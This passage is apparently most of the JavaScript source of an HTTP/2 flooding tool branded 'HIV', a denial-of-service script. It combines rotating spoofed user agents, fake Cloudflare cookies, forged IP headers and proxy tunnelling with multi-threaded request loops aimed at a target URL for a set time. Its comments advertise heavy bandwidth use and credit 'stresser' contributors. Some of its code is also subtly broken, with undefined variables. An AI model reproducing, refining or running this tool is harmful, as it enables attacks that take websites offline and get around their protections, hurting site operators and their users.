  "Mozilla/5.0 (iPhone16,1; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3522.454 Safari/537.36 Edg/92.1",
  "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4531.364 Safari/537.36",
  "Mozilla/5.0 (X11; Arch Linux; Linux x86_64) AppleWebKit/660.4 (KHTML, like Gecko) Version/11.1 Safari/660.4",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.5589.928 Safari/537.36 Edg/110.2",
  "Mozilla/5.0 (X11; Arch Linux; Linux x86_64; rv:102.2) Gecko/20100101 Firefox/102.2",
  "Mozilla/5.0 (iPhone15,2; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4326.664 Safari/537.36 OPR/62.8",
  "Mozilla/5.0 (Macintosh; Apple Silicon Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.5829.241 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5884.294 Safari/537.36",
  "Mozilla/5.0 (X11; Arch Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.3795.334 Safari/537.36 OPR/62.8",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/670.0 (KHTML, like Gecko) Version/12.0 Safari/670.0",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.3078.82 Safari/537.36 OPR/84.5",
  "Mozilla/5.0 (Macintosh; Apple Silicon Mac OS X 14_5) AppleWebKit/640.7 (KHTML, like Gecko) Version/13.2 Safari/640.7",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.5674.242 Safari/537.36 SamsungBrowser/23.0",
  "Mozilla/5.0 (X11; Arch Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.3505.292 Safari/537.36 SamsungBrowser/21.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.5092.460 Safari/537.36 Edg/106.2",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.3831.189 Safari/537.36 SamsungBrowser/23.0",
  "Mozilla/5.0 (X11; Arch Linux; Linux x86_64; rv:78.9) Gecko/20100101 Firefox/78.9",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_1) AppleWebKit/537.36 (KHTML, like Gecko) Brave/90.0.4595.80 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.3629.653 Safari/537.36",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5993.901 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; 23049PCD8G; U2T/47) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5581.235 Safari/537.36",
  "Mozilla/5.0 (X11; Arch Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.5779.524 Safari/537.36",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.5323.137 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Apple Silicon Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.4041.927 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_1) AppleWebKit/650.9 (KHTML, like Gecko) Version/12.0 Safari/650.9",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.3785.180 Safari/537.36 OPR/80.9",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/92.0.3433.728 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; HUAWEI Mate 40 Pro; A0B/94) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.3707.947 Safari/537.36",
  "Mozilla/5.0 (X11; Arch Linux; Linux x86_64) AppleWebKit/660.2 (KHTML, like Gecko) Version/14.0 Safari/660.2",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.3543.83 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Pixel 6a; WY6/94) AppleWebKit/537.36 (KHTML, like Gecko) Brave/104.0.5111.731 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.4305.880 Safari/537.36 SamsungBrowser/18.0",
  "Mozilla/5.0 (Linux; Android 12; 2201117PG; YE8/93) AppleWebKit/670.0 (KHTML, like Gecko) Version/17.0 Safari/670.0",
  "Mozilla/5.0 (X11; Arch Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4561.351 Safari/537.36 SamsungBrowser/20.0",
  "Mozilla/5.0 (iPhone16,1; CPU iPhone OS 17_3 like Mac OS X; rv:112.7) Gecko/20100101 Firefox/112.7",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_7; rv:100.7) Gecko/20100101 Firefox/100.7",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/620.8 (KHTML, like Gecko) Version/15.0 Safari/620.8",
  "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.3740.128 Safari/537.36 OPR/68.3",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4265.623 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro; E4P/8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5759.246 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.5949.808 Safari/537.36 Edg/83.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.3557.120 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4287.870 Safari/537.36",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:78.4) Gecko/20100101 Firefox/78.4",
  "Mozilla/5.0 (iPhone15,3; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/630.9 (KHTML, like Gecko) Version/13.0 Safari/630.9"
];
if (fs.existsSync(process.cwd()+`/ua.txt`)) {
  UAList = readLines(process.cwd()+'/ua.txt');
}
var CookieCf = [
  "--no-sandbox",
  "--disable-setuid-sandbox",
  "--disable-infobars",
  "--disable-logging",
  "--disable-login-animations",
  "--disable-notifications",
  "--disable-gpu",
  "--headless",
  "--lang=ko_KR",
  "--start-maxmized",
  "--ignore-certificate-errors",
  "--hide-scrollbars",
  "--mute-audio",
  "--disable-web-security",
  "--incognito",
  "--disable-canvas-aa",
  "--disable-2d-canvas-clip-aa",
  "--disable-accelerated-2d-canvas",
  "--no-zygote",
  "--use-gl=desktop",
  "--disable-gl-drawing-for-tests",
  "--disable-dev-shm-usage",
  "--no-first-run",
  "--disable-features=IsolateOrigins,site-per-process",
  "--ignore-certificate-errors-spki-list",
  "--user-agent=Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:107.0) Gecko/20110101 Firefox/107.0",
  "?__cf_bm=0-fjqX6DYQfSIrEm-PffQ90Rv6Mrb0jacMZUsJeh-1759929482-1-io7tkGRzDRH0G2-DKl93Iw",
  "?__cf_clearance=noMAximhQATmfJRekwvsAGZoN8U-1762345782-0-1-30bdeaf0.1d5b6994-44.322.0",
  "?__cf_bm=nG8AGi18rqaCixWUL5kpdV6knkm9T_vFdn8SwPeJ-1759459093-1-pAJyjdf33RZ11hJmPuKf4g",
  "?__cf_bm=oS_NdBznWszxRuF4WXTGeeUHmA1fL9_WwnYebg0M-1760060992-1-TwCmkTPpYydPCrQgH2ppdg",
  "?__cf_bm=LWK8IrZFutXmeMhCX6_oawNMkF7uTUhwNdlHjOiy-1760931528-1-2nayY2C-DDcMIpQZKuJ2Yw",
  "?__cf_clearance=mpqtGDDEYk3LHBeXn_nJCUWHM4s-1761864504-0-1-af5b91ab.0429131c-61.964.0",
  "?__cf_bm=aBLOK8Pch52d-7BF5wz9ccFNrNt4lZIbA5Zm9c_a-1762339204-1-dRGcOcWeJEE0rLK94W9chQ",
  "?__cf_bm=2dOSyx-pmwe-8JBYEbSN_lzcXcIWOaFcdGIVahui-1760204691-1-Sfx0nzVxZJP0IptLMeMK6g",
  "?__cf_bm=3KT2EgG3RADrGJSwqgO0Xd9n0LDS-cLGy-ZWpg1K-1762174857-1-vaUkiCP7Ad15ntCKuASo2g",
  "?__cf_bm=OG3hzk37vOG4GrmgJ-41vxKYxXkDflkuqbzYnQQL-1760888842-1-zVI-tbTNDaAu0PfetcXXqw",
  "?__cf_bm=Tdv4Y-qdrGIj04AdG32b9D1RDtdSoAyfNwBYZieZ-1761743093-1--ddZodplg-GvlBclefOnUA",
  "?__cf_clearance=xEtHuqSSt5MsCYRsybbUtWEgy7k-1761043651-0-1-ced3cc2c.56cb5229-906.365.0",
  "?__cf_clearance=ZNkjnyT0L9N8WJv4pASygKvFXMw-1761183277-0-1-5481a62b.57569dae-836.873.0",
  "?__cf_bm=cBRqkiuHzDCdtCm59yh0CQcqOlkY6wiLv7LAOzVb-1761770280-1-hPkqAbNA8P9-YDScOPsNVA",
  "?__cf_bm=aMDIDSEaHhwgXGdksw0tEJGmapLmliizK_cD10om-1761582961-1-ci96Es9OmbXhBBPh-cfqRQ",
  "?__cf_bm=guw3_fDcz6OAQY8yXzo6NYcATZAj3C0FG8EpHY0_-1762183527-1-sUk6qSsBmsH1VMtzkY60Yw",
  "?__cf_bm=sVw-IY_CqwnhbfkK7V09YGDHFkIMl9ozQ1MyfYAU-1761953913-1-vbf7t17y59Op9wZ-VRGTvg",
  "?__cf_chl_rt_tk=_wMINoIDH4uMu9fUZcpxQEKDl6CCiO3n-1761986118-0-gaNycGzNy-6T",
  "?__cf_clearance=Dz5ZMx5kKORrR2dk1qA5I2qDZxA-1761786231-0-1-0d2ca374.5eeb1d08-69.877.0"
];
var type = [
  "text/plain",
  "text/html",
  "application/json",
  "application/xml",
  "multipart/form-data",
  "application/octet-stream",
  "image/jpeg",
  "image/png",
  "audio/mpeg",
  "video/mp4",
  "application/javascript",
  "application/pdf",
  "application/vnd.ms-excel",
  "application/vnd.ms-powerpoint",
  "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
  "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  "application/zip",
  "image/gif",
  "image/bmp",
  "image/tiff",
  "audio/wav",
  "audio/midi",
  "video/avi",
  "video/mpeg",
  "video/quicktime",
  "text/csv",
  "text/xml",
  "text/css",
  "text/javascript",
  "application/graphql",
  "application/x-www-form-urlencoded",
  "application/vnd.api+json",
  "application/ld+json",
  "application/x-pkcs12",
  "application/x-pkcs7-certificates",
  "application/x-pkcs7-certreqresp",
  "application/x-pem-file",
  "application/x-x509-ca-cert",
  "application/x-x509-user-cert",
  "application/x-x509-server-cert",
  "application/x-bzip",
  "application/x-gzip",
  "application/x-7z-compressed",
  "application/x-rar-compressed",
  "application/x-shockwave-flash"
];
/* HIV BY @XVLISRINZE
* Change Watermark = NooOOo ReSpect a Bitch For Ever
* [ WARNING ] |||UwU||| This Method Eating Big Bandwidth
* Before Ur Server Suspended Usage A Verx Method THX @xvlisrinze
* CONTRIBUTOR <|>
* @TVCVINXCODE - PROOFTEST
* @aurenstresser - YEP*
* @@Xyooooooooo - Bagas Monet
*/
let headerGenerator = new HeaderGenerator({
  browsers: [
    { name: "firefox", minVersion: 112, httpVersion: "2" },
    { name: "opera", minVersion: 112, httpVersion: "2" },
    { name: "edge", minVersion: 112, httpVersion: "2" },
    { name: "chrome", minVersion: 112, httpVersion: "2" },
    { name: "safari", minVersion: 16, httpVersion: "2" },
  ],
  devices: ["desktop", "mobile",
  ],
  operatingSystems: ["windows", "linux", "macos", "android", "ios",],
  locales: ["en-US", "en"]
  });
var randomHeaders = headerGenerator.getHeaders()
var browserVersion = randomInt(120, 123);
var arrboti = randomElement(['Google Chrome', 'Brave']);
var isBrave = arrboti === 'Brave';
var acceptHeaderValue = isBrave ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
let brandValue;
if (browserVersion === 120) brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${arrboti}";v="${browserVersion}"`;
else if (browserVersion === 121) brandValue = `"Not A(Brand";v="99", "${arrboti}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
else if (browserVersion === 122) brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${arrboti}";v="${browserVersion}"`;
else if (browserVersion === 123) brandValue = `"${arrboti}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
let proxies = [];
if (!fs.existsSync(process.cwd()+`/${args.proxyFile}`)) {
  console.log(textcolors(`Hiv Attacks Without Proxy [ Proxy Not Found ]`));
} else if (fs.existsSync(process.cwd()+`/${args.proxyFile}`)) {
  proxies = readLines(process.cwd()+`/${args.proxyFile}`);
}
var parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let i = 1; i <= args.thread; i++) {
    cluster.fork();
  }
} else {
  setInterval(HivStartAttack);
}
class NetworkSocket {
  constructor() {}
  performHTTPRequest(args1, callback) {
    var parsedAddress = args.address.split(":");
    var addressHost = parsedAddress[0];
    var payload = "CONNECT " + args.address + `:${args.port} HTTP/1.1\r\nHost: ` + args.address + `:${args.port}\r\nConnection: Keep-Alive\r\n\r\n`;
    var buffer = Buffer.from(payload);
    var connection = net.connect({
      host: args1.host,
      port: args1.port
    });
    connection.setTimeout(args.timeout * 100000);
    connection.setKeepAlive(true, 100000);
    connection.on("connect", () => {
      connection.write(buffer);
    });
    connection.on("data", chunk => {
      var response = chunk.toString("utf-8");
      var isAlive = response.includes("HTTP/1.1 200");
      if (!isAlive) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });
    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });
    connection.on("error", error => {
      connection.destroy();
      return callback(undefined, "error: " + error);
    });
  }
}
var Socket = new NetworkSocket();
headers["x-forwarded-for"] = randomElement(proxies)?.split(":");
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + generateRandomString(5) + "=" + generateRandomString(25);
headers["cache-control"] = randomHeaders['cache-control'];
headers["x-frame-options"] = randomHeaders['x-frame-options'];
headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
headers["x-cache"] = randomHeaders['x-cache'];
headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
headers["x-download-options"] = randomHeaders['x-download-options'];
headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
headers["pragma"] = randomHeaders['pragma'];
headers["vary"] = randomHeaders['vary'];
headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
headers["Via"] = spoofedIP;
headers["sss"] = spoofedIP;
headers["Sec-Websocket-Key"] = spoofedIP;
headers["Client-IP"] = spoofedIP;
//headers["Real-IP"] = spoofedIP;
headers["Client-IP"] = randomElement(proxies)?.split(":");
headers["Real-IP"] = randomElement(proxies)?.split(":");
headers["Sec-Websocket-Version"] = 13;
headers["X-Forwarded-For"] = spoofedIP;
headers["X-Forwarded-Host"] = spoofedIP;
headers["upgrade-insecure-requests"] = "1";
headers["sec-gpc"] = isBrave ? "1" : undefined;
headers["cdn-loop"] = "cloudflare";
headers["CF-Connecting-IP"] = spoofedIP;
headers["CF-RAY"] = "randomRayValue";
headers["CF-Visitor"] = "{'scheme':'https'}";
headers[":scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers["accept-language"] = randomElement(languageHeaders);
headers["accept-encoding"] = randomElement(encodingHeaders);
headers['cf-cache-status'] = "BYPASS", "HIT", "DYNAMIC";
headers["cache-control"] = randomElement(controlHeaders);
headers["sec-ch-ua"] = `${brandValue}` || '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = `\"Windows\"`;
headers["Connection"] = Math.random() > 0.5 ? "keep-alive" : "close";
headers["upgrade-insecure-requests"] = "1";
headers["referer"] = randomElement(referers);
headers["accept"] = randomElement(acceptHeaders);
headers["Content-Type"] = randomElement(type);
headers["user-agent"] = randomElement(UAList);
headers["cookie"] = randomElement(CookieCf);
headers["sec-fetch-dest"] = randomElement(['document','image','embed','empty','frame','script']);
headers["sec-fetch-mode"] = randomElement(['cors','navigate','no-cors','same-origin']);
headers["sec-fetch-site"] = randomElement(['cross-site','same-origin','same-site','none']);
headers["TE"] = "trailers";
headers["sec-fetch-user"] = "?1";
headers["DNT"] = '1';
headers["x-requested-with"] = "XMLHttpRequest";
function HivStartAttack() {
  var proxyAddress = randomElement(proxies);
  var parsedProxy = proxyAddress.split(":"); 
  headers["referer"] = "https://" + parsedTarget.host + "/?" + generateRandomString(15);
  headers["origin"] = "https://" + parsedTarget.host;
  var proxyOptions = {         
    host: parsedProxy[0],
    port: parseInt(parsedProxy[1]),
    address: parsedTarget.host + `:${args.port}`,
    timeout: 100,
  };
  Socket.performHTTPRequest(proxyOptions, (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 600000);
    var tlsOptions = {
      host: parsedTarget.host,
      port: args.port,
      secure: true,
      ALPNProtocols: ['h2', 'http/1.1', 'h2c'],
      resolveWithFullResponse: true,
      followAllRedirects: true,
      honorCipherOrder: true,
      Compression: false,
      maxRedirects: 50,
      clientTimeout: 20000,
      clientlareMaxTimeout: 10000,
      cloudflareTimeout: 20000,
      cloudflareMaxTimeout: 30000,
      sessionTimeout: 20000,
      challengesToSolve: Infinity,
      sigalgs: randomElement(AlgorithmeSupport),
      ciphers: tls.getCiphers().join(":") + randomElement(supportedCipherSuites),
      ecdhCurve: randomElement(["auto", "GREASE:X25519:x25519:P-256:P-384:P-521:X448", "GREASE:x25519:secp256r1:secp384r1", "prime256v1:X25519", "GREASE:X25519:x25519"]),
      host: parsedTarget.host,
      rejectUnauthorized: false,
      servername: parsedTarget.host,
      secureProtocol: ["TLSv1_2_method", "TLSv1_3_method"],
      secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |
        crypto.constants.SSL_OP_NO_SSLv3 |
        crypto.constants.SSL_OP_NO_TLSv1 |
        crypto.constants.SSL_OP_NO_TLSv1_1 |
        crypto.constants.SSL_OP_NO_TLSv1_3 |
        crypto.constants.ALPN_ENABLED |
        crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
        crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
        crypto.constants.SSL_OP_COOKIE_EXCHANGE |
        crypto.constants.SSL_OP_PKCS1_CHECK_1 |
        crypto.constants.SSL_OP_PKCS1_CHECK_2 |
        crypto.constants.SSL_OP_SINGLE_DH_USE |
        crypto.constants.SSL_OP_SINGLE_ECDH_USE |
        crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
        crypto.constants.SSL_OP_NO_TICKET |
        crypto.constants.SSL_OP_NO_COMPRESSION,
      secureContext: tls.createSecureContext({
        host: parsedTarget.host,
        rejectUnauthorized: false,
        servername: parsedTarget.host,
        ciphers: tls.getCiphers().join(":") + randomElement(supportedCipherSuites),
        sigalgs: randomElement(AlgorithmeSupport),
        honorCipherOrder: true,
        secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |
          crypto.constants.SSL_OP_NO_SSLv3 |
          crypto.constants.SSL_OP_NO_TLSv1 |
          crypto.constants.SSL_OP_NO_TLSv1_1 |
          crypto.constants.SSL_OP_NO_TLSv1_3 |
          crypto.constants.ALPN_ENABLED |
          crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
          crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
          crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
          crypto.constants.SSL_OP_COOKIE_EXCHANGE |
          crypto.constants.SSL_OP_PKCS1_CHECK_1 |
          crypto.constants.SSL_OP_PKCS1_CHECK_2 |
          crypto.constants.SSL_OP_SINGLE_DH_USE |
          crypto.constants.SSL_OP_SINGLE_ECDH_USE |
          crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
          crypto.constants.SSL_OP_NO_TICKET |
          crypto.constants.SSL_OP_NO_COMPRESSION,
        secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
      }),
    };
    var tlsConnection = tls.connect(args.port, parsedTarget.host, tlsOptions); 
    tlsConnection.setKeepAlive(true, 60000);
    var client = http2.connect(parsedTarget.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 2000,
        initialWindowSize: 65535,
        maxHeaderListSize: 65536,
        enablePush: false
      },
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => tlsConnection,
      socket: connection,
    });
    client.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 2000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 65536,
      enablePush: false
    });
    var hecm = new hpack();
    hecm.setTableSize(4096)
    client.on("connect", () => {
      var intervalAttack = setInterval(() => {
        var shuffleObject = (obj) => {
          var keys = Object.keys(obj);
          for (let i = keys.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [keys[i], keys[j]] = [keys[j], keys[i]];
          }
          const shuffledObj = {};
          keys.forEach(key => shuffledObj[key] = obj[key]);
          return shuffledObj;
        };
        var hivheaders = shuffleObject(headers);
        var packed = Buffer.concat([
          Buffer.from([0x80, 0, 0, 0, 0xFF]),
          hecm.encode(hivheaders)
        ]);
        for (let i = 0; i < args.rps; i++) {
          var request = client.request(headers).on("response", response => {
            request.close();
            request.destroy();
            return;
          });
          request.end();
          var frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
          requests.push({ requestPromise, frame });
        }
      }, 1000); 
    });
    client.on("close", () => {
      client.destroy();
      connection.destroy();
      return;
    });
  });
}

var execode = () => process.exit(-1);
setTimeout(execode, args.time * 1000);
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
} catch(e) {
  console.log(e);
}